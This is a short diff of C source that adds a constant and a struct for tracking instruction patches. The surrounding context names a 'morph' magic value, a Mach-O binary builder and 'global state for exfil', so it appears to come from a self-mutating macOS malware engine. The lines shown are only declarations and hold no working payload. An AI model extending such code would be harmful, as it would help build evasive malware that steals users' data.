@@ -85,6 +85,7 @@
 #define ALIGN_8(x) (((x) + 7) & ~7)
 
 #define MX_GEN 3
+#define MX_MEM 8
 static const uint8_t MORPH_MAGIC[8] = {'A', 'E', 'T', 'H', 'R', 0, 0, 0};
 
 /* DEBUG=1 (FOO flag) */
@@ -652,6 +653,14 @@ typedef struct {
     size_t strtab_size;
 } macho_builder_t;
 
+    /* Collect all patches first, then apply with offset tracking */
+typedef struct {
+    size_t inst_off;
+    int typ;
+    size_t tgt;
+    int64_t oldtgt;
+    bool is_call;
+    } info_t;
 
 /* Global state for exfil */
 extern char *_strings[8];
